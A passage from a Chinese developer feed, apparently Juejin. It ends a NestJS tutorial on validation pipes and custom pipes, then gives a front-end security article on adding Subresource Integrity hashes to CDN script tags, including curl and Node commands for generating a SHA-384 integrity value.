<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1c0964f7bdb440a997111abde1c9f590~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=%2FlvSofEbulE9mMQcTdEjP3l1E9M%3D" alt="image.png" loading="lazy"/></p>
<p>ParseUUIDPipe</p>
<p>UID 是一种随机生成的几乎不可能重复的字符串，做 id</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd347332075e4a84882266650fb05149~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=FN3C1fSAqbEHlhaBu59jxHf1Tys%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77e075322bed4b13af551a9c9a824635~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=kNcOd758dobyjncRGCrpy%2FH%2BK3g%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce79004c1b11486aaaba2316f5daaec8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=CMAV81o6xz6aGmGWf1ltVQVHcns%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe3067b71349439c86d2c98127a707b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=FytHVEwIiGVUhh7ggXRci6fQ2S0%3D" alt="image.png" loading="lazy"/></p>
<p>不是 uuid 会报错</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be2caca925514f238544b308c29eef39~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=rkXPFVbT0wAltwRm5WdKQEmc0J0%3D" alt="image.png" loading="lazy"/></p>
<p>DefaultValuePipe 设置默认值</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85b39c793849405b84c18a6d80cd86f4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=HQ3PZ9VRo8OlSMHj%2BTrXYBAaAf8%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97d28c91b9b243cfb514b1243d269bbe~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=lmHew2u8AuyJ9p9tFOGUnHcS53w%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">实现个 Pipe</h2>
<p>自己写一个 pipe 也很简单，实现 PipeTransform 接口的 transform 方法，返回值就是传给 handler 的值</p>
<pre><code class="hljs language-css" lang="css">nest g pipe aaa <span class="hljs-attr">--flat</span> <span class="hljs-attr">--no-spec</span>
</code></pre>
<p>生成一个 pipe，打印下参数值，返回 aaa</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31fd56d1104340be8180888a1679d598~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=NTBPoEkh%2FmrGNqlF3dPhbMuwqtw%3D" alt="image.png" loading="lazy"/></p>
<p>使用</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76cbe20df92f4e45a8e9ca4fdacba949~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=bJdJ4Nl02vEaCeoGxDDQ%2F7aNzLM%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f9fe0edd188473991d4f42d5cc22565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=5HTdu2uBxViYdwOJaxcw%2FALSF3w%3D" alt="image.png" loading="lazy"/></p>
<p>返回的值是 aaaaaa，也就是说 pipe 的返回值就是传给 handler 的参数值。</p>
<p>打印的 value 就是 query、param 的值，而 metadata 里包含 type、metatype、data</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/036a95f40e0c43c58162810e3998c6a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YmN56uv5LuY6LGq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770691366&amp;x-signature=UecdIPPq9hR5Iyk7glen%2BOWPNPA%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端代码安全 - 你的代码真的安全吗？]]></title>    <link>https://juejin.cn/post/7602135278665252916</link>    <guid>https://juejin.cn/post/7602135278665252916</guid>    <pubDate>2026-02-03T02:45:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602135278665252916" data-draft-id="7602161364892090368" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端代码安全 - 你的代码真的安全吗？"/> <meta itemprop="keywords" content="前端,安全"/> <meta itemprop="datePublished" content="2026-02-03T02:45:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梅川_酷子"/> <meta itemprop="url" content="https://juejin.cn/user/1488075996274921"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端代码安全 - 你的代码真的安全吗？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1488075996274921/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梅川_酷子
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T02:45:41.000Z" title="Tue Feb 03 2026 02:45:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">安全检测</h2>
<p>  近期线上代码安全检测遇到一些问题反馈，都是一些开发中不常见、不显现的问题。所以记录一下，了解一些新的安全防护的方法，方便日后开发中能够未雨绸缪。</p>
<h3 data-id="heading-1">SRI 检查</h3>
<p>Subresource Integrity （子资源完整性）</p>
<h4 data-id="heading-2">问题代码：</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">修改后的代码</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- 此代码中 integrity 值不可直接使用 --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>
  <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"</span>
  <span class="hljs-attr">integrity</span>=<span class="hljs-string">"sha384-FwzUI3CDd**************FBTolvoj"</span>
  <span class="hljs-attr">crossorigin</span>=<span class="hljs-string">"anonymous"</span>
&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-4">修改方式</h4>
<h6 data-id="heading-5">1. 在线工具 SRI Hash Generator</h6>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsrihash.org%2F" target="_blank" title="https://srihash.org/" ref="nofollow noopener noreferrer">srihash.org/</a></p>
<h6 data-id="heading-6">2. 命令行</h6>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 下载外部资源</span>
curl -O https://cdn.bootcdn.net/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js
</code></pre>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 生成 integrity 的值</span>
node -e <span class="hljs-string">"const fs = require('fs'); const crypto = require('crypto'); const hash = crypto.createHash('sha384').update(fs.readFileSync('jsencrypt.min.js')).digest('base64'); console.log('sha384-' + hash)"</span>
</code></pre>
<p><sup><a href="#user-content-fn-1" id="user-content-user-content-fnref-1" data-footnote-ref="" aria-describedby="footnote-label" title="#user-content-fn-1">1</a></sup>跳转至代码翻译</p>
<h4 data-id="heading-7">使用注意事项</h4>
<p>integrity：核心校验属性，格式为 算法名-Base64哈希值，支持的算法：sha256、sha384、sha512（推荐 sha384/sha512，安全性更高）；</p>
<p>crossorigin：跨域资源必填，不填的话浏览器不校验。常用 anonymous（不发送凭据），几乎不用 use-credentials（发送凭据）。</p>
<h4 data-id="heading-8">详细原因</h4>
<p>用于资源完整性校验，保证用户浏览器每次获取外部资源时，得到的都是原封不动资源，防止恶意篡改</p>
<p><strong>一本正经：</strong><br/>
原理：intergrity 的值，是算法名，加上根据资源源代码，通过算法，生成的 hash 值<br/>
算法的目标代码不同，生成的 hash 值也就不同<br/>
在 script 标签中加入这个属性后，标签在获取到外部资源时，会自动对获取的资源通过算法生成 hash 值<br/>
用新生成的 hash 值，与 intergrity 的属性值做对比：<br/>
相同，表示资源无变动，安全；不同，表示资源有变动，丢弃该资源</p>
<p><strong>通俗大白话：</strong><br/>
通俗讲，就是提前告诉浏览器：我要的东西，用这个算法，会得到这个结果。<br/>
浏览器：知道了，等我运行的时候，拿到东西我先算一下，看结果一样不，一样我再用，不一样我就扔了。</p>
<h3 class="sr-only" id="user-content-footnote-label" data-id="heading-9">Footnotes</h3>
<ol>
<li id="user-content-user-content-fn-1">
<p><strong>代码翻译</strong></p>
<p>整个命令是 Node.js 的-e参数用法（-e = --eval，表示执行后面的字符串代码），核心依赖 Node.js 内置的fs（文件系统）和crypto（加密）模块，无需额外安装依赖：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. 引入Node.js内置模块，无需npm install</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>) <span class="hljs-comment">// 用于读取本地文件内容</span>
<span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">'crypto'</span>) <span class="hljs-comment">// 用于生成加密哈希值</span>

<span class="hljs-comment">// 2. 生成SHA-384哈希并Base64编码</span>
<span class="hljs-keyword">const</span> hash = crypto
  .<span class="hljs-title function_">createHash</span>(<span class="hljs-string">'sha384'</span>) <span class="hljs-comment">// 创建SHA-384哈希计算实例</span>
  .<span class="hljs-title function_">update</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">'jsencrypt.min.js'</span>)) <span class="hljs-comment">// 读取文件内容并传入哈希实例</span>
  .<span class="hljs-title function_">digest</span>(<span class="hljs-string">'base64'</span>) <span class="hljs-comment">// 计算哈希并输出Base64格式（SRI要求的编码格式）</span>

<span class="hljs-comment">// 3. 拼接SRI规范格式并打印</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'sha384-'</span> + hash)
</code></pre>
<a href="#user-content-fnref-1" data-footnote-backref="" class="data-footnote-backref" aria-label="Back to content" title="#user-content-fnref-1">↩</a>
</li>
</ol>
</div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>